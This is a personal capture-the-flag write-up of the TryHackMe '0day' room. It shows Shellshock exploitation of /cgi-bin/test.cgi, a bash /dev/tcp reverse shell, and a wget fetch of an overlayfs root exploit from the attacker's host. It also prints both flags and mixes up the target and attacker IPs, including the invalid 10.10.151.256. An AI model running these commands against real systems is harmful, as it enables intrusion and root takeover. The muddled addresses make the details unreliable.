# 0day

**Platform:** TryHackMe
**Date:** **2026-07-05**
**Difficulty:** Medium
**Category:** Linux / Web 
**Room URL:** https://tryhackme.com/room/0day
**Status:** ✅ Completed

---

## 📌 What Was This Room About?
> This 0day themed room has to be hacked into using Shell Shock vulnerability, notably CVE-2014–6278 and CVE-2014–6271, enumerate using Nikto, exploit the cgi-bin path, and escalate privilege access using the ‘overlayfs’ Local Privilege Escalation technique (CVE-2015–1328) on the machine.

---
## Note:
To avoid any confusion with the IP addresses.
This IP address: 10.10.151.256 is the target IP address
And this IP address: 10.10.151.254 is my own machine's ip address.

---

## 🔍 Reconnaissance

### Nmap Scan
```bash
sudo nmap -sC -sV -T4 -A -vv 10.10.151.256 -oN nmap_0day
```

**Results:**
Nmap scan report for 10.10.151.256  
Host is up, received echo-reply ttl 61 (0.39s latency).  
Scanned at 2021-08-01 17:37:16 WIB for 61s  
Not shown: 998 closed ports  
Reason: 998 resets  
PORT   STATE SERVICE REASON         VERSION  
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)  
| ssh-dss AAAAB3NzaC1kc3MAAACBAPcMQIfRe52VJuHcnjPyvMcVKYWsaPnADsmH+FR4OyR5lMSURXSzS15nxjcXEd3i9jk14amEDTZr1zsapV1Ke2Of/n6V5KYoB7p7w0HnFuMriUSWStmwRZCjkO/LQJkMgrlz1zVjrDEANm3fwjg0I7Ht1/gOeZYEtIl9DRqRzc1ZAAAAFQChwhLtInglVHlWwgAYbni33wUAfwAAAIAcFv6QZL7T2NzBsBuq0RtlFux0SAPYY2l+PwHZQMtRYko94NUv/XUaSN9dPrVKdbDk4ZeTHWO5H6P0t8LruN/18iPqvz0OKHQCgc50zE0pTDTS+GdO4kp3CBSumqsYc4nZsK+lyuUmeEPGKmcU6zlT03oARnYA6wozFZggJCUG4QAAAIBQKMkRtPhl3pXLhXzzlSJsbmwY6bNRTbJebGBx6VNSV3imwPXLR8VYEmw3O2Zpdei6qQlt6f2S3GaSSUBXe78h000/JdckRk6A73LFUxSYdXl1wCiz0TltSogHGYV9CxHDUHAvfIs5QwRAYVkmMe2H+HSBc3tKeHJEECNkqM2Qiw==  
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)  
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwY8CfRqdJ+C17QnSu2hTDhmFODmq1UTBu3ctj47tH/uBpRBCTvput1+++BhyvexQbNZ6zKL1MeDq0bVAGlWZrHdw73LCSA1e6GrGieXnbLbuRm3bfdBWc4CGPItmRHzw5dc2MwO492ps0B7vdxz3N38aUbbvcNOmNJjEWsS86E25LIvCqY3txD+Qrv8+W+Hqi9ysbeitb5MNwd/4iy21qwtagdi1DMjuo0dckzvcYqZCT7DaToBTT77Jlxj23mlbDAcSrb4uVCE538BGyiQ2wgXYhXpGKdtpnJEhSYISd7dqm6pnEkJXSwoDnSbUiMCT+ya7yhcNYW3SKYxUTQzIV  
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKF5YbiHxYqQ7XbHoh600yn8M69wYPnLVAb4lEASOGH6l7+irKU5qraViqgVR06I8kRznLAOw6bqO2EqB8EBx+E=  
|   256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIItaO2Q/3nOu5T16taNBbx5NqcWNAbOkTZHD2TB1FcVg  
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.7 ((Ubuntu))  
| http-methods:   
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-server-header: Apache/2.4.7 (Ubuntu)  
|_http-title: 0day  
OS fingerprint not ideal because: maxTimingRatio (1.854000e+00) is greater than 1.4  
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)  
No exact OS matches for host (test conditions non-ideal).  
TCP/IP fingerprint:  
SCAN(V=7.91%E=4%D=8/1%OT=22%CT=1%CU=32594%PV=Y%DS=4%DC=T%G=N%TM=61067999%P=x86_64-pc-linux-gnu)  
SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)  
SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%TS=8)  
OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)  
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)  
ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)  
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)  
T2(R=N)  
T3(R=N)  
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)  
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)  
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)  
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)  
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)  
IE(R=Y%DFI=N%T=40%CD=S)  
  
Uptime guess: 204.567 days (since Sat Jan  9 04:01:07 2021)  
Network Distance: 4 hops  
TCP Sequence Prediction: Difficulty=258 (Good luck!)  
IP ID Sequence Generation: All zeros  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
TRACEROUTE (using port 53/tcp)  
HOP RTT       ADDRESS  
1   254.58 ms 10.2.0.1  
2   ... 3  
4   381.57 ms 10.10.151.256  
  
Read data files from: /usr/bin/../share/nmap  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  

---

## 🧭 Steps I Took

> Write each step in order. Explain WHY you did it, not just WHAT you did.

### Step 1 — 
- **What I did:** Port 22 from the nmap result provided information on the version OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0), but this version does not have a vulnerability, therefore we must wait for port 80. Port 80 is another open port on the target machine, which is running web technology with Apache httpd 2.4.7 ((Ubuntu)). The next phase is to use nikto to enumerate information deeply and ffuf to enumerate directories.

$ nikto -host 10.10.151.254                  
- Nikto v2.1.6  
---------------------------------------------------------------------------  
+ Target IP:          10.10.151.254  
+ Target Hostname:    10.10.151.254  
+ Target Port:        80  
+ Start Time:         2021-08-01 17:38:10 (GMT7)  
---------------------------------------------------------------------------  
+ Server: Apache/2.4.7 (Ubuntu)  
+ The anti-clickjacking X-Frame-Options header is not present.  
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS  
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type  
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.  
+ Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip  
+ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true  
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).  
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS   
+ OSVDB-3092: /admin/: This might be interesting...  
+ OSVDB-3092: /backup/: This might be interesting...  
+ OSVDB-3268: /css/: Directory indexing found.  
+ OSVDB-3092: /css/: This might be interesting...  
+ OSVDB-3268: /img/: Directory indexing found.  
+ OSVDB-3092: /img/: This might be interesting...  
+ OSVDB-3092: /secret/: This might be interesting...  
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...  
+ OSVDB-3233: /icons/README: Apache default file found.  
+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect (timeout): Operation now in progress  
+ Scan terminated:  19 error(s) and 17 item(s) reported on remote host  
+ End Time:           2021-08-01 18:20:49 (GMT7) (2559 seconds)  
---------------------------------------------------------------------------  
+ 1 host(s) tested  

I discovered a shell shock vulnerability in the directory/path _/cgi-bin/test.cgi_ as a result of _nikto_.

- **Command/Tool used:**
```bash
# nikto -host 10.10.151.254
```
- **What I found:** I learned about a new tool called nikto which can help me to enumerate ports and discover which ports are vulnerable.
- **Why it matters:** This matters because now I have nikto to use whenever i need to know which port is vulnerable instead of scrolling through hundreds of exploits on Exploit DB.

### Step 2 — 
- **What I did:** Next up I used ffuf to enumerate directories:
  $ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.151.254/FUZZ -mc 200,301,302 -e .php,.txt,.html -fs 3025  
  
        /'___\  /'___\           /'___\         
       /\ \__/ /\ \__/  __  __  /\ \__/         
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\        
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/        
         \ \_\   \ \_\  \ \____/  \ \_\         
          \/_/    \/_/   \/___/    \/_/         
  
       v1.3.0-git  
________________________________________________  
  
 :: Method           : GET  
 :: URL              : http://10.10.151.254/FUZZ  
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
 :: Extensions       : .php. txt. html   
 :: Follow redirects : false  
 :: Calibration      : false  
 :: Timeout          : 10  
 :: Threads          : 40  
 :: Matcher          : Response status: 200,301,302  
 :: Filter           : Response size: 3025  
________________________________________________  
  
cgi-bin                 [Status: 301, Size: 311, Words: 20, Lines: 10]  
img                     [Status: 301, Size: 307, Words: 20, Lines: 10]  
uploads                 [Status: 301, Size: 311, Words: 20, Lines: 10]  
admin                   [Status: 301, Size: 309, Words: 20, Lines: 10]  
css                     [Status: 301, Size: 307, Words: 20, Lines: 10]  
js                      [Status: 301, Size: 306, Words: 20, Lines: 10]  
backup                  [Status: 301, Size: 310, Words: 20, Lines: 10]  
secret                  [Status: 301, Size: 310, Words: 20, Lines: 10]

- **Command/Tool used:**
```bash
# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.151.254/FUZZ -mc 200,301,302 -e .php,.txt,.html -fs 3025  
```
- **What I found:** I found that ffuf is much better at enumerating directories than dirb. Ffuf is better for modern web fuzzing because it is faster, supports recursion, and allows fuzzing in multiple parts of a request (URL, headers, POST data), while dirb is older, lacks recursion, and is slower.
- **Why it matters:** This matters because now I get more accurate and a more powerful tool.

### Step 3 — 
- **What I did:** I searched searchsploit for the shellshock exploit.
$ searchsploit shellshock                              
-------------------------------------------------------------------------------- ---------------------------------  
 Exploit Title                                                                  |  Path  
-------------------------------------------------------------------------------- ---------------------------------  
Advantech Switch - 'Shellshock' Bash Environment Variable Command Injection (Me | cgi/remote/38849.rb  
Apache mod_cgi - 'Shellshock' Remote Command Injection                          | linux/remote/34900.py  
Bash - 'Shellshock' Environment Variables Command Injection                     | linux/remote/34766.php  
Bash CGI - 'Shellshock' Remote Command Injection (Metasploit)                   | cgi/webapps/34895.rb  
Cisco UCS Manager 2.1(1b) - Remote Command Injection (Shellshock)               | hardware/remote/39568.py  
dhclient 4.1 - Bash Environment Variable Command Injection (Shellshock)         | linux/remote/36933.py  
GNU Bash - 'Shellshock' Environment Variable Command Injection                  | linux/remote/34765.txt  
IPFire - 'Shellshock' Bash Environment Variable Command Injection (Metasploit)  | cgi/remote/39918.rb  
NUUO NVRmini 2 3.0.8 - Remote Command Injection (Shellshock)                    | cgi/webapps/40213.txt  
OpenVPN 2.2.29 - 'Shellshock' Remote Command Injection                          | linux/remote/34879.txt  
PHP < 5.6.2 - 'Shellshock' Safe Mode / disable_functions Bypass / Command Injec | php/webapps/35146.txt  
Postfix SMTP 4.2.x < 4.2.48 - 'Shellshock' Remote Command Injection             | linux/remote/34896.py  
RedStar 3.0 Server - 'Shellshock' 'BEAM' / 'RSSMON' Command Injection           | linux/local/40938.py  
SonicWall SSL-VPN 8.0.0.0 - 'shellshock/visualdoor' Remote Code Execution (Unau | hardware/webapps/49499.py  
Sun Secure Global Desktop and Oracle Global Desktop 4.61.915 - Command Injectio | cgi/webapps/39887.txt  
TrendMicro InterScan Web Security Virtual Appliance - 'Shellshock' Remote Comma | hardware/remote/40619.py  
-------------------------------------------------------------------------------- ---------------------------------  
Shellcodes: No Results

**Apache mod_cgi — ‘Shellshock’ Remote Command Injection**. Then I copied the exploit script `linux/remote/34900.py` to attack box.

$ searchsploit -m linux/remote/34900.py   
  Exploit: Apache mod_cgi - 'Shellshock' Remote Command Injection  
      URL: https://www.exploit-db.com/exploits/34900  
     Path: /usr/share/exploitdb/exploits/linux/remote/34900.py  
File Type: Python script, ASCII text executable, with CRLF line terminators  
  
Copied to: /usr/share/myexploits/34900.py
- **Command/Tool used:**
```bash
# searchsploit shellshock
# searchsploit -m linux/remote/34900.py
```

### Step 4 — 
- **What I did:** On the script I added `/cgi-bin/test.cgi` as the vulnerable file

except:  
 pages = ["/cgi-bin/test.cgi","/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"]  
try:  

after I modified the exploit python script, I ran the exploit with command `python2.7 34900.py payload=reverse rhost=10.10.151.254 lhost=10.2.81.7 lport=4444`

`$ python2.7 34900.py payload=reverse rhost=10.10.151.256 lhost=10.2.81.7 lport=4444                           1 ⨯  
`[!] Started reverse shell handler  
`[-] Trying exploit on : /cgi-bin/test.cgi  
`[!] Successfully exploited  
`[!] Incoming connection from 10.10.151.256  
`10.10.151.256> id  
`uid=33(www-data) gid=33(www-data) groups=33(www-data)  
  
`10.10.151.256> bash -i >& /dev/tcp/10.2.81.7/4445 0>&1 
`10.10.151.256> 

To have tty shell from target, I tried to create another reverse shell connection `bash -i >& /dev/tcp/10.2.81.7/4445 0>&1` and prepare netcat listener `nc -lvnp 4445`

`$ nc -lvnp 4445                                                                                           130 ⨯  
`Ncat: Version 7.91 ( https://nmap.org/ncat )  
`Ncat: Listening on :::4445  
`Ncat: Listening on 0.0.0.0:4445  
`Ncat: Connection from 10.10.151.254  
`Ncat: Connection from 10.10.151.254:57527.  
`bash: cannot set terminal process group (854): Inappropriate ioctl for device  
`bash: no job control in this shell  
`www-data@ubuntu:/usr/lib/cgi-bin$ ls -la  
`ls -la  
`total 12  
`drwxr-xr-x  2 root root 4096 Sep  2  2020 .  
`drwxr-xr-x 54 root root 4096 Sep  2  2020 ..  
`-rwxr-xr-x  1 root root   73 Sep  2  2020 test.cgi  
`www-data@ubuntu:/usr/lib/cgi-bin$ whoami  
`whoami  
`www-data  
`www-data@ubuntu:/usr/lib/cgi-bin$

I was successfully able to gain access to the target machine. And from there I was able to get the first flag: 

www-data@ubuntu:/usr/lib/cgi-bin$ cd /home/ryan  
cd /home/ryan  
www-data@ubuntu:/home/ryan$ ls -la  
ls -la  
total 28  
drwxr-xr-x 3 ryan ryan 4096 Sep  2  2020 .  
drwxr-xr-x 3 root root 4096 Sep  2  2020 ..  
lrwxrwxrwx 1 ryan ryan    9 Sep  2  2020 .bash_history -> /dev/null  
-rw-r--r-- 1 ryan ryan  220 Sep  2  2020 .bash_logout  
-rw-r--r-- 1 ryan ryan 3637 Sep  2  2020 .bashrc  
drwx------ 2 ryan ryan 4096 Sep  2  2020 .cache  
-rw-r--r-- 1 ryan ryan  675 Sep  2  2020 .profile  
-rw-rw-r-- 1 ryan ryan   22 Sep  2  2020 user.txt  
www-data@ubuntu:/home/ryan$ cat user.txt  
cat user.txt  
`THM{Sh3llSh0ck_r0ckz}
www-data@ubuntu:/home/ryan$

- **Command/Tool used:**
```bash
# python2.7 34900.py payload=reverse rhost=10.10.151.254 lhost=10.2.81.7 lport=4444`
# bash -i >& /dev/tcp/10.2.81.7/4445 0>&1 
# nc -lvnp 4445   
```
- **What I found:** What I found out is that most of these exploits run on Python 2, I had python 3 installed and it was a pain to install Python2 and make the system default to Python 2 instead of 3.
- **Why it matters:** This matters because now I am going to have Python2 and 3 installed just for this purpose.

### Step 5 — 
- **What I did:** This is the privilage escalation section. I checked the kernel version using command `uname -a`

www-data@ubuntu:/usr/lib/cgi-bin$ uname -a  
uname -a  
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux  
www-data@ubuntu:/usr/lib/cgi-bin$ 

I downloaded the exploit 37292.c, # Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation.

www-data@ubuntu:/tmp$ wget http://10.2.81.7/37292.c  
wget http://10.2.81.7/37292.c  
--2021-08-01 05:00:03--  http://10.2.81.7/37292.c  
Connecting to 10.2.81.7:80... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 5119 (5.0K) [text/x-csrc]  
Saving to: '37292.c'  
  
     0K ....                                                  100% 13.0M=0s  
  
2021-08-01 05:00:04 (13.0 MB/s) - '37292.c' saved [5119/5119]

I ran into an error when exploit.c was compiled.

www-data@ubuntu:/tmp$ gcc 37292.c -o ofs  
gcc 37292.c -o ofs  
gcc: error trying to exec 'cc1': execvp: No such file or directory  
www-data@ubuntu:/tmp$ 

To fix the error, I needed to export the binpath from the machine target using command `export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin`

www-data@ubuntu:/tmp$ export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin  
t PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin           
www-data@ubuntu:/tmp$ 

I tried compiling the script again:

www-data@ubuntu:/tmp$ gcc 37292.c -o ofs  
gcc 37292.c -o ofs  

And I used this command to run the exploit:
www-data@ubuntu:/tmp$ `./ofs`

I got root access and flag!

`THM{g00d_j0b_0day_is_Pleased}`

- **Command/Tool used:**
```bash
# `uname -a`
# wget http://10.2.81.7/37292.c  
# export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin`
# gcc 37292.c -o ofs  
```
- **What I found:** I found that whenever C files give this error gcc: error trying to exec 'cc1': execvp: No such file or directory  I can always run this command to fix it:  `export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin`
- **Why it matters:** This matters because now I don't have to spend twenty minutes scrolling throw documentation.

---

## 🛠 Commands Used

| Command                                                                                                                                             | What It Does                                               |
| --------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
| sudo nmap -sC -sV -T4 -A -vv 10.10.151.256 -oN nmap_0day                                                                                            | Does an intense scan on the target system                  |
| nikto -host 10.10.151.254                                                                                                                           | Enumerates ports for vulnerabilities                       |
| ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.151.254/FUZZ -mc 200,301,302 -e .php,.txt,.html -fs 3025  <br> | Enumerates hidden directories                              |
| searchsploit shellshock<br>searchsploit -m linux/remote/34900.py                                                                                    | Searches for a exploit called shellshock and downloades it |
| python2.7 34900.py payload=reverse rhost=10.10.151.254 lhost=10.2.81.7 lport=4444                                                                   | Starts the exploit                                         |
| bash -i >& /dev/tcp/10.2.81.7/4445 0>&1                                                                                                             | Starts a shell                                             |
| nc -lvnp 4445                                                                                                                                       | Starts a listener                                          |
| uname -a                                                                                                                                            | Check kernel version                                       |
| wget http://10.2.81.7/37292.c                                                                                                                       | Gets a file from another device                            |
| export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin                                                                            | Fixes the C compiling error                                |
| gcc 37292.c -o ofs                                                                                                                                  | Compiles the exploit                                       |
| ./ofs                                                                                                                                               | Run the exploit                                            |



---

## 🚩 Flags Found

| Flag      | Value                           |
| --------- | ------------------------------- |
| User flag | `THM{Sh3llSh0ck_r0ckz}`         |
| Root flag | `THM{g00d_j0b_0day_is_Pleased}` |

---

## 📎 Resources Used
> Links to tutorials, writeups, or documentation that helped you.

- https://www.exploit-db.com/exploits/37292
- https://gtfobins.org/

---
